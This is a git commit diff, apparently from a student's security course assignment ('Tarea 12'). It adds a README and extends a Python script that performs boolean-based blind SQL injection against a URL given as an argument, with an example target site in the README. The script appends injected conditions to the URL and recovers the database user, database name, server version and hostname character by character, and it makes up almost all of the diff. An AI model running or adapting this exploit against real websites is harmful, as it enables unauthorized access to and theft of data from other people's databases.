9a963d3173ae420d0c7e5f87a94640ff41a22a59
Dialid <dialid.ceron@gmail.com>
2020-08-04 14:35:41 -0500

    Tarea 12

---
+++ Tarea 12. Blind/README.md
@@ -0,0 +1,2 @@
+## Sintaxis: ./blind_sql url-a-iterar
+Ejemplo: ./blind_sql http://truerandom.bid/papeleria/?nombre=cuadernos
--- Tarea 12. Blind/blind_sql.py
+++ Tarea 12. Blind/blind_sql.py
@@ -1,6 +1,6 @@
 #!/usr/bin/python
 #Ceron Rodriguez Lezly Dialid
-
+#Recordatio: Crear funciones para evitar repetir tanto codigo
 import requests
 import sys
 
@@ -10,6 +10,12 @@ i=1
 user=0
 version=0
 database=0
+host=0
+usuario = []
+ver = []
+base = []
+hostname = []
+
 while user == 0:
 	url=sys.argv[1]+"' AND LENGTH(user()) = " +str(i) +" -- -v" 
 	response = requests.get(url,headers=header) 
@@ -33,3 +39,116 @@ while database == 0:
 		print("Tamanio de database: " + str(i))
 		database=i
 	i= i+1
+i=1
+while host == 0:
+	url=sys.argv[1]+"' AND LENGTH(@@hostname) = " +str(i) +" -- -v" 
+	response = requests.get(url,headers=header) 
+	if "Si hay" in response.text:
+		print("Tamanio de hostname: " + str(i))
+		host=i
+	i= i+1
+
+for x in range(1, user+1):
+	i=48
+	while len(usuario) == x-1 and i<58:
+		url=sys.argv[1]+"' AND ascii(substring(user()," +str(x) +",1)) = " +str(i) +" -- -v"
+		response = requests.get(url,headers=header) 
+		if "Si hay" in response.text:
+			usuario.append(chr(i))
+		i=i+1
+	i=65
+	while len(usuario) == x-1 and i<91:
+		url=sys.argv[1]+"' AND ascii(substring(user()," +str(x) +",1)) = " +str(i) +" -- -v"
+		response = requests.get(url,headers=header) 
+		if "Si hay" in response.text:
+			usuario.append(chr(i))
+		i=i+1
+	i=97
+	while len(usuario) == x-1 and i<123:
+		url=sys.argv[1]+"' AND ascii(substring(user()," +str(x) +",1)) = " +str(i) +" -- -v"
+		response = requests.get(url,headers=header) 
+		if "Si hay" in response.text:
+			usuario.append(chr(i))
+		i=i+1
+print("Usuario: ")
+for x in range(len(usuario)): 
+    print usuario[x], 
+
+for x in range(1, database+1):
+	i=48
+	while len(base) == x-1 and i<58:
+		url=sys.argv[1]+"' AND ascii(substring(database()," +str(x) +",1)) = " +str(i) +" -- -v"
+		response = requests.get(url,headers=header) 
+		if "Si hay" in response.text:
+			base.append(chr(i))
+		i=i+1
+	i=65
+	while len(base) == x-1 and i<91:
+		url=sys.argv[1]+"' AND ascii(substring(database()," +str(x) +",1)) = " +str(i) +" -- -v"
+		response = requests.get(url,headers=header) 
+		if "Si hay" in response.text:
+			base.append(chr(i))
+		i=i+1
+	i=97
+	while len(base) == x-1 and i<123:
+		url=sys.argv[1]+"' AND ascii(substring(database()," +str(x) +",1)) = " +str(i) +" -- -v"
+		response = requests.get(url,headers=header) 
+		if "Si hay" in response.text:
+			base.append(chr(i))
+		i=i+1
+print("\nBase de datos: ")
+for x in range(len(base)): 
+    print base[x], 
+
+
+for x in range(1, version+1):
+	i=48
+	while len(ver) == x-1 and i<58:
+		url=sys.argv[1]+"' AND ascii(substring(@@version," +str(x) +",1)) = " +str(i) +" -- -v"
+		response = requests.get(url,headers=header) 
+		if "Si hay" in response.text:
+			ver.append(chr(i))
+		i=i+1
+	i=65
+	while len(ver) == x-1 and i<91:
+		url=sys.argv[1]+"' AND ascii(substring(@@version," +str(x) +",1)) = " +str(i) +" -- -v"
+		response = requests.get(url,headers=header) 
+		if "Si hay" in response.text:
+			ver.append(chr(i))
+		i=i+1
+	i=97
+	while len(ver) == x-1 and i<123:
+		url=sys.argv[1]+"' AND ascii(substring(@@version," +str(x) +",1)) = " +str(i) +" -- -v"
+		response = requests.get(url,headers=header) 
+		if "Si hay" in response.text:
+			ver.append(chr(i))
+		i=i+1
+print("\nVersion: ")
+for x in range(len(ver)): 
+    print ver[x],
+
+for x in range(1, host+1):
+	i=48
+	while len(hostname) == x-1 and i<58:
+		url=sys.argv[1]+"' AND ascii(substring(@@hostname," +str(x) +",1)) = " +str(i) +" -- -v"
+		response = requests.get(url,headers=header) 
+		if "Si hay" in response.text:
+			hostname.append(chr(i))
+		i=i+1
+	i=65
+	while len(hostname) == x-1 and i<91:
+		url=sys.argv[1]+"' AND ascii(substring(@@hostname," +str(x) +",1)) = " +str(i) +" -- -v"
+		response = requests.get(url,headers=header) 
+		if "Si hay" in response.text:
+			hostname.append(chr(i))
+		i=i+1
+	i=97
+	while len(hostname) == x-1 and i<123:
+		url=sys.argv[1]+"' AND ascii(substring(@@hostname," +str(x) +",1)) = " +str(i) +" -- -v"
+		response = requests.get(url,headers=header) 
+		if "Si hay" in response.text:
+			hostname.append(chr(i))
+		i=i+1
+print("\nHostname: ")
+for x in range(len(hostname)): 
+    print hostname[x],
